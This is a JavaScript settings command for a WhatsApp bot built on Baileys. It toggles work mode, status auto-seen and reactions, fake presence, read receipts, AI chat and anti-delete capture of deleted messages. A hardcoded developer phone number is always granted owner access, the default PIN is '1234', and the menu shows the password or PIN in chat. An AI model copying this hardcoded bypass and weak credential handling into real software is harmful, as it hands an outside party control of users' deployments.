// commands/settings.js
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const mongoose = require('mongoose');
const { jidNormalizedUser } = require('@whiskeysockets/baileys');

// 👑 ROOT DEVELOPER NUMBER
const DEVELOPER_NUMBER = '94719845166';
const DEFAULT_LOGO_BACKUP = 'https://files.catbox.moe/a58add.jpeg';

const memSettingsCache = new Map();

// ⚡ Dynamic Session Logo Resolver
async function getBotLogoBuffer(botNum) {
  try {
    let logoSource = null;

    if (typeof global.getBotSettings === 'function' && botNum) {
      const st = await global.getBotSettings(botNum);
      if (st?.botLogo) logoSource = st.botLogo;
    }

    if (!logoSource) logoSource = DEFAULT_LOGO_BACKUP;

    if (typeof logoSource === 'string') {
      if (logoSource.startsWith('data:image')) {
        const base64Data = logoSource.split(',')[1];
        return Buffer.from(base64Data, 'base64');
      }

      if (logoSource.startsWith('http')) {
        const res = await axios.get(logoSource, { responseType: 'arraybuffer', timeout: 8000 });
        return Buffer.from(res.data);
      }

      if (fs.existsSync(logoSource)) {
        return fs.readFileSync(logoSource);
      }
    }
  } catch (e) {}

  try {
    const res = await axios.get(DEFAULT_LOGO_BACKUP, { responseType: 'arraybuffer', timeout: 6000 });
    return Buffer.from(res.data);
  } catch (err) {
    return null;
  }
}

function getModel() {
  try {
    if (mongoose.connection.readyState !== 1) return null;
    return mongoose.models.BotSettings || mongoose.model('BotSettings') || mongoose.models.Settings || mongoose.model('Settings');
  } catch (e) {
    return null;
  }
}

module.exports = {
  name: 'settings',
  alias: ['setting', 'set', 'config'],
  category: 'owner',
  desc: 'Manage individual bot settings',

  async execute(sock, msg, args = [], chatJid, safeReply, options = {}) {
    const targetChat = chatJid || msg.key?.remoteJid;
    if (!targetChat) return;

    const channelContext = global.channelContext || {};

    const rawBotId = sock.user?.id || sock.user?.jid || '';
    const botNumber = jidNormalizedUser(rawBotId).replace(/\D/g, '') || 'default';

    // ⚡ 1. SENDER RESOLUTION (Group / Private / LID Support)
    const isGroup = targetChat.endsWith('@g.us');
    let senderJid = isGroup 
      ? (msg.key?.participant || msg.participant || '') 
      : (msg.key?.fromMe ? (sock.user?.id || '') : targetChat);

    if (senderJid.endsWith('@lid') && sock.signalRepository?.lidToJid) {
      try {
        const resolved = await sock.signalRepository.lidToJid(senderJid);
        if (resolved) senderJid = resolved;
      } catch (e) {}
    }

    const cleanSenderNum = jidNormalizedUser(senderJid).replace(/\D/g, '');

    // 👑 2. MASTER DEVELOPER & OWNER VERIFICATION
    const isDeveloper = cleanSenderNum === DEVELOPER_NUMBER;
    const isOwner = Boolean(
      isDeveloper ||
      options.isOwner || 
      msg.key?.fromMe || 
      (Array.isArray(global.owner) && global.owner.some(o => String(o).replace(/\D/g, '') === cleanSenderNum)) ||
      cleanSenderNum === botNumber
    );

    const reply = async (content) => {
      try {
        if (typeof safeReply === 'function' && typeof content === 'string') return await safeReply(content);
        const payload = typeof content === 'string' ? { text: content } : { ...content };
        return await sock.sendMessage(targetChat, { ...payload, ...channelContext }, { quoted: msg });
      } catch (err) {}
    };

    if (!isOwner) {
      return await reply('⛔ *Access Denied!* Settings වෙනස් කළ හැක්කේ Bot හිමිකරුට (Owner) පමණි.');
    }

    const defaultValues = {
      workMode: 'public',
      autoStatusSeen: true,
      statusReact: true,
      statusReactEmoji: '💚',
      autoPresence: 'off',
      alwaysOnline: 'off',
      autoChatRead: false,
      aiChatEnabled: false,
      antiDeleteEnabled: true,
      antiDeleteType: 'all',
      antiDeleteDest: 'me',
      securityPin: '1234',
      botPassword: null,
      coins: 50
    };

    let settings = { ...defaultValues };

    try {
      if (typeof global.getBotSettings === 'function') {
        const doc = await global.getBotSettings(botNumber);
        if (doc) settings = Object.assign(settings, doc);
      } else {
        const SettingsModel = getModel();
        if (SettingsModel) {
          const doc = await SettingsModel.findById(botNumber).lean();
          if (doc) settings = Object.assign(settings, doc);
        }
      }
    } catch (e) {}

    // Input Extraction
    const rawText = (msg.message?.conversation || msg.message?.extendedTextMessage?.text || '').trim();
    let input = "";

    if (Array.isArray(args) && args.length > 0) {
      input = args.join(' ').trim().toLowerCase();
    } else {
      input = rawText.toLowerCase().trim();
    }

    input = input.replace(/^[./!#]?(settings|setting|set|config)\s*/i, '').trim();

    let isUpdated = false;

    // 1. WORK MODE
    if (input === '1.1' || input === 'private') { settings.workMode = 'private'; isUpdated = true; }
    else if (input === '1.2' || input === 'public') { settings.workMode = 'public'; isUpdated = true; }
    else if (input === '1.3' || input === 'inbox') { settings.workMode = 'inbox'; isUpdated = true; }
    else if (input === '1.4' || input === 'groups' || input === 'group') { settings.workMode = 'groups'; isUpdated = true; }

    // 2. AUTO STATUS SEEN
    else if (input === '2.1' || input === 'statusseen on') { settings.autoStatusSeen = true; isUpdated = true; }
    else if (input === '2.2' || input === 'statusseen off') { settings.autoStatusSeen = false; isUpdated = true; }
    else if (input === '2') { settings.autoStatusSeen = !settings.autoStatusSeen; isUpdated = true; }

    // 3. STATUS REACTION ON/OFF
    else if (input === '3.1' || input === 'react on') { settings.statusReact = true; isUpdated = true; }
    else if (input === '3.2' || input === 'react off') { settings.statusReact = false; isUpdated = true; }
    else if (input === '3') { settings.statusReact = !settings.statusReact; isUpdated = true; }

    // 4. STATUS REACT EMOJI
    else if (input === '4.1' || input === 'react green') { 
      settings.statusReact = true;
      settings.statusReactEmoji = '💚'; 
      isUpdated = true; 
    }
    else if (input === '4.2' || input === 'react random') { 
      settings.statusReact = true;
      settings.statusReactEmoji = 'random'; 
      isUpdated = true; 
    }
    else if (input.startsWith('4.3 ') || input.startsWith('4 ')) {
      const parts = input.split(' ');
      const emoji = parts.slice(1).join('').trim();
      if (emoji) {
        settings.statusReact = true;
        settings.statusReactEmoji = emoji;
        isUpdated = true;
      } else {
        return await reply('⚠️ කරුණාකර Emoji එකක් ලබාදෙන්න! (උදා: `.set 4.3 🔥` හෝ `.set 4 🌸`)');
      }
    }

    // 5. FAKE ACTION (PRESENCE)
    else if (input === '5.1' || input === 'typing') { settings.autoPresence = 'composing'; isUpdated = true; }
    else if (input === '5.2' || input === 'recording') { settings.autoPresence = 'recording'; isUpdated = true; }
    else if (input === '5.3' || input === 'presence off') { settings.autoPresence = 'off'; isUpdated = true; }

    // 6. CHANGE PIN
    else if (input.startsWith('pin') || input.startsWith('6')) {
      const parts = input.split(' ');
      const newPin = parts[1] ? parts[1].trim() : '';
      if (newPin && newPin.length >= 4) {
        settings.securityPin = newPin;
        isUpdated = true;
      } else {
        return await reply('⚠️ අවම අංක 4ක PIN එකක් ලබාදෙන්න! (උදා: `.set 6 7788`)');
      }
    }

    // 7. AUTO CHAT READ (BLUE TICK)
    else if (input === '7.1' || input === 'read on') { settings.autoChatRead = true; isUpdated = true; }
    else if (input === '7.2' || input === 'read off') { settings.autoChatRead = false; isUpdated = true; }
    else if (input === '7') { settings.autoChatRead = !settings.autoChatRead; isUpdated = true; }

    // 8. AI AUTO CHAT
    else if (input === '8.1' || input === 'ai on') { settings.aiChatEnabled = true; isUpdated = true; }
    else if (input === '8.2' || input === 'ai off') { settings.aiChatEnabled = false; isUpdated = true; }
    else if (input === '8') { settings.aiChatEnabled = !settings.aiChatEnabled; isUpdated = true; }

    // 9. ANTI-DELETE ON/OFF
    else if (input === '9.1' || input === 'antidel on') { settings.antiDeleteEnabled = true; isUpdated = true; }
    else if (input === '9.2' || input === 'antidel off') { settings.antiDeleteEnabled = false; isUpdated = true; }
    else if (input === '9') { settings.antiDeleteEnabled = !settings.antiDeleteEnabled; isUpdated = true; }

    // 10. ANTI-DELETE SCOPE
    else if (input === '10.1' || input === 'scope inbox') { settings.antiDeleteType = 'inbox'; isUpdated = true; }
    else if (input === '10.2' || input === 'scope group') { settings.antiDeleteType = 'group'; isUpdated = true; }
    else if (input === '10.3' || input === 'scope all') { settings.antiDeleteType = 'all'; isUpdated = true; }

    // 11. ANTI-DELETE DESTINATION (ME / FROM)
    else if (input === '11.1' || input === 'antisend me' || input === 'antidel me') { 
      settings.antiDeleteDest = 'me'; 
      isUpdated = true; 
    }
    else if (input === '11.2' || input === 'antisend from' || input === 'antidel from') { 
      settings.antiDeleteDest = 'from'; 
      isUpdated = true; 
    }

    // 12. ALWAYS ONLINE / OFFLINE
    else if (input === '12.1' || input === 'online on') { 
      settings.alwaysOnline = 'on'; 
      isUpdated = true; 
      sock.sendPresenceUpdate('available').catch(() => {});
    }
    else if (input === '12.2' || input === 'online offline') { 
      settings.alwaysOnline = 'offline'; 
      isUpdated = true; 
      sock.sendPresenceUpdate('unavailable').catch(() => {});
    }
    else if (input === '12.3' || input === 'online off') { 
      settings.alwaysOnline = 'off'; 
      isUpdated = true; 
      sock.sendPresenceUpdate('unavailable').catch(() => {});
    }

    // UPDATE EXECUTOR
    if (isUpdated) {
      memSettingsCache.set(botNumber, settings);

      try {
        const SettingsModel = getModel();
        if (SettingsModel) {
          await SettingsModel.findByIdAndUpdate(
            botNumber,
            { $set: settings },
            { upsert: true, new: true }
          );
        }
      } catch (e) {}

      if (typeof global.clearSettingsCache === 'function') {
        global.clearSettingsCache(botNumber);
      }

      const reactEmojiDisplay = settings.statusReactEmoji === 'random' ? 'RANDOM EMOJIS 🔀' : (settings.statusReactEmoji || '💚');
      const antiSendDisplay = settings.antiDeleteDest === 'from' ? 'CHAT ITSELF (FROM) 💬' : 'MY INBOX (ME) 📥';

      await sock.sendMessage(targetChat, { react: { text: "✅", key: msg.key } }).catch(() => {});

      return await reply(
        `✅ *[+${botNumber}]* Settings යාවත්කාලීන විය!\n\n` +
        `• Work Mode       : *${settings.workMode.toUpperCase()}*\n` +
        `• Status Seen     : *${settings.autoStatusSeen ? 'ON 🟢' : 'OFF 🔴'}*\n` +
        `• Status React    : *${settings.statusReact ? 'ON 🟢' : 'OFF 🔴'}*\n` +
        `• React Style     : *${reactEmojiDisplay}*\n` +
        `• Anti-Delete     : *${settings.antiDeleteEnabled ? 'ON 🟢' : 'OFF 🔴'}*\n` +
        `• Anti-Send Dest  : *${antiSendDisplay}*\n` +
        `• Always Online   : *${settings.alwaysOnline.toUpperCase()}*`
      );
    }

    // DISPLAY SETTINGS MENU
    await sock.sendMessage(targetChat, { react: { text: "⚙️", key: msg.key } }).catch(() => {});

    const stateBadge = (val) => (val !== false ? '🟢 ON' : '🔴 OFF');
    const modeBadge = {
      public: 'PUBLIC 🌐',
      private: 'PRIVATE 🔒',
      inbox: 'INBOX 📥',
      groups: 'GROUPS 👥'
    }[settings.workMode] || 'PUBLIC 🌐';

    const currentReactDisplay = settings.statusReactEmoji === 'random' ? 'RANDOM 🔀' : (settings.statusReactEmoji || '💚');
    const antiSendDestDisplay = settings.antiDeleteDest === 'from' ? 'FROM (Chat Itself) 💬' : 'ME (My Inbox) 📥';
    const displayPassword = settings.botPassword || settings.securityPin || 'NOT SET';
    const displayCoins = settings.coins || 0;

    const menu = 
`╭─── ⚡ *HESHAN-MD SYSTEM SETTINGS* ⚡ ───╮
│
├ 📱 *BOT NUMBER  :* +${botNumber}
├ 🔑 *PORTAL KEY  :* \`${displayPassword}\`
├ 🪙 *COIN BALANCE:* *${displayCoins} Coins*
├ 🛡️ *ACCESS LEVEL:* ${isDeveloper ? '👑 Root Developer' : 'Owner Verified'}
│
├─◈ *1. WORK MODE* ⤿ [ ${modeBadge} ]
│  ├ 1.1 Private
│  ├ 1.2 Public
│  ├ 1.3 Inbox Only
│  └ 1.4 Group Only
│
├─◈ *2. AUTO STATUS SEEN* ⤿ [ ${stateBadge(settings.autoStatusSeen)} ]
│  ├ 2.1 Status Seen On
│  └ 2.2 Status Seen Off
│
├─◈ *3. STATUS REACTION* ⤿ [ ${stateBadge(settings.statusReact)} ]
│  ├ 3.1 React On 🟢
│  └ 3.2 React Off 🔴
│
├─◈ *4. STATUS REACT EMOJI* ⤿ [ ${currentReactDisplay} ]
│  ├ 4.1 💚 Green Heart Only
│  ├ 4.2 🔀 Random Emojis Mode
│  └ 4.3 <emoji> (උදා: .set 4.3 🔥)
│
├─◈ *5. FAKE ACTION* ⤿ [ ${(settings.autoPresence || 'off').toUpperCase()} ]
│  ├ 5.1 Fake Typing ✍️
│  ├ 5.2 Fake Recording 🎙️
│  └ 5.3 Turn Off 🔴
│
├─◈ *6. CHANGE PIN* ⤿ [ ${settings.securityPin || '1234'} ]
│  └ ✦ Type: .set 6 <new_pin>
│
├─◈ *7. AUTO MSG SEEN* ⤿ [ ${stateBadge(settings.autoChatRead)} ]
│  ├ 7.1 Auto Seen On (Blue Tick)
│  └ 7.2 Auto Seen Off
│
├─◈ *8. AI AUTO CHAT* ⤿ [ ${stateBadge(settings.aiChatEnabled)} ]
│  ├ 8.1 AI Chat On 🤖
│  └ 8.2 AI Chat Off 🛑
│
├─◈ *9. ANTI-DELETE* ⤿ [ ${stateBadge(settings.antiDeleteEnabled)} ]
│  ├ 9.1 Anti-Delete On 🛡️
│  └ 9.2 Anti-Delete Off 🛑
│
├─◈ *10. ANTI-DELETE SCOPE* ⤿ [ ${(settings.antiDeleteType || 'all').toUpperCase()} ]
│  ├ 10.1 Inbox Only
│  ├ 10.2 Groups Only
│  └ 10.3 All Chats
│
├─◈ *11. ANTI-DELETE SEND TO* ⤿ [ ${antiSendDestDisplay} ]
│  ├ 11.1 Send To Me (My Inbox) 📥
│  └ 11.2 Send To From (Same Chat) 💬
│
├─◈ *12. ALWAYS ONLINE* ⤿ [ ${settings.alwaysOnline.toUpperCase()} ]
│  ├ 12.1 Always Online 🟢
│  ├ 12.2 Always Offline ⚪
│  └ 12.3 Normal Mode 🔴
│
╰────────────────────────────────╯
💡 *පාලනය කිරීමට:*
• Settings පණිවිඩයට අදාළ අංකය Reply කරන්න (උදා: *11.1* හෝ *11.2*)
• නැතහොත් command එක run කරන්න (උදා: *.set 11.1*, *.set antisend from*)

> ⚡ ᴘᴏᴡᴇʀᴇᴅ ʙʏ ʜᴇꜱʜᴀɴ-ᴍᴅ ⚡`.trim();

    try {
      const logoBuffer = await getBotLogoBuffer(botNumber);
      if (logoBuffer) {
        await sock.sendMessage(targetChat, {
          image: logoBuffer,
          caption: menu,
          mimetype: 'image/jpeg',
          ...channelContext
        }, { quoted: msg });
        return;
      }
    } catch (err) {}

    await sock.sendMessage(targetChat, { 
      text: menu,
      ...channelContext
    }, { quoted: msg }).catch(() => {});
  }
};
